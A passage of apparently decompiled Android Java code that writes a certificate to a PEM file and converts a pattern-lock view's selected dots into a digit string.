                fos.write("-----BEGIN CERTIFICATE-----".getBytes(java.nio.charset.StandardCharsets.UTF_8));
                fos.write(10);
                fos.write(android.util.Base64.encode(cert.getEncoded(), android.util.Base64.DEFAULT));
                fos.write(10);
                fos.write("-----END CERTIFICATE-----".getBytes(java.nio.charset.StandardCharsets.UTF_8));
                fos.flush();
                fos.close();
                return file;
            }
        } catch (Exception e) {
            AppUtils.s("AdbKeyUtils", e);
        }
        return null;
    }

    /** vendor g.E0() — convert pattern dots to string representation */
    public static String E0(com.guard.wallet.patternlock.PatternLockView view, java.util.ArrayList list) {
        if (list == null) {
            return "";
        }
        int size = list.size();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < size; i++) {
            com.guard.wallet.patternlock.PatternDot dot = (com.guard.wallet.patternlock.PatternDot) list.get(i);
            int row = dot.a;
            sb.append(view.getDotCount() * row + dot.b);
        }
        return sb.toString();
    }
}
